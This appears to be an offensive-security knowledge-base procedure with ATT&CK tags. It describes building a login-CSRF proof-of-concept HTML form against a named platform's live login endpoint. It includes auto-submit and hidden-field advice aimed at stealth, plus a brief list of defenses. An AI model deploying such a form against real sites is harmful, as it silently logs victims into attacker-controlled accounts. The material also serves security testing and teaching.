---
id: proc-csrf-poc-creation
tags:
  - csrf
  - web
  - poc-creation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:36.037Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-CSRF-Login-POC-HTML

## Summary

This procedure outlines the creation of a proof-of-concept (POC) HTML form exploiting CSRF in the Unikrn login endpoint, allowing unauthorized credential submission without victim awareness.

## Description

In the context of the Unikrn platform, the login API at https://unikrn.com/apiv1/login lacks proper session validation, making it vulnerable to CSRF attacks. This procedure creates a malicious HTML page with a form that POSTs to the endpoint. When loaded in the victim's browser (e.g., via a link), it automatically or semi-automatically submits attacker credentials, logging the victim into the attacker's account. Prerequisites include basic HTML knowledge and access to a text editor. Expected outcomes: A functional POC that demonstrates the vulnerability.

## Requirements

1. Text editor (e.g., VS Code, Notepad++)
2. Knowledge of the target endpoint: https://unikrn.com/apiv1/login
3. Victim must be authenticated to the site in a way that allows cross-site requests (e.g., same-site cookies)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in login forms to validate request origin
- Use SameSite=Strict cookies to prevent cross-site submissions
- Monitor for anomalous login patterns from unusual referrers

## Objectives

1. Generate a submitable HTML form targeting the vulnerable login API
2. Ensure form is hidden or auto-submits to evade detection
3. Validate POC functionality in a testing environment

## Instructions

### Step 1: Draft Basic HTML Structure

**Context**: Start with a minimal HTML page containing a form that POSTs to the login endpoint.

Create a file named `csrf-poc.html` and add the following structure:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF POC</title></head>
<body>
    <form action="https://unikrn.com/apiv1/login" method="POST">
        <input type="hidden" name="usr" value="">
        <input type="hidden" name="pwd" value="">
        <input type="submit" value="Click to Continue">
    </form>
</body>
</html>
```

> This creates hidden fields for email (usr) and password (pwd). The submit button can be styled or scripted to auto-submit for stealth.

### Step 2: Test Form Submission

**Context**: Verify the form targets the correct endpoint without errors.

Open the HTML file in a browser while logged out of Unikrn, click submit, and check network tab in dev tools for the POST request to /apiv1/login.

> Expected: A 200/302 response indicating submission attempt. No login occurs yet without credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[csrf]]
- [[web]]
- [[poc-creation]]
